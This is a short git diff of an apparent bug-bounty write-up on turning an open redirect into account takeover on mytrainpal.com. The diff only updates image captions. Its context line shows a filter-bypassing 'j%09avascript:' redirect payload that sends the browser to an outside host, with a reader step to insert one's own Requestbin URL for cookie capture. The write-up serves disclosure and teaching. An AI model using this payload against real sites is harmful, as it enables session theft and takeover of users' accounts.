@@ -45,7 +45,11 @@ https://www.mytrainpal.com/signin?next=j%09avascript:document.location='https://
 
 Make sure to replace the URL with your own Requestbin URL to see it in action.
 
-![image](/assets/img/open_redirect_to_acc_0.jpg)
+![Open redirect POC](/assets/img/open_redirect_to_acc_0.jpg)
+
+![Redirect demo](/assets/img/open_redirect_to_acc_1.jpg)
+
+![Cookie capture](/assets/img/open_redirect_to_acc_2.jpg)
 
 ## Impact and Importance
 
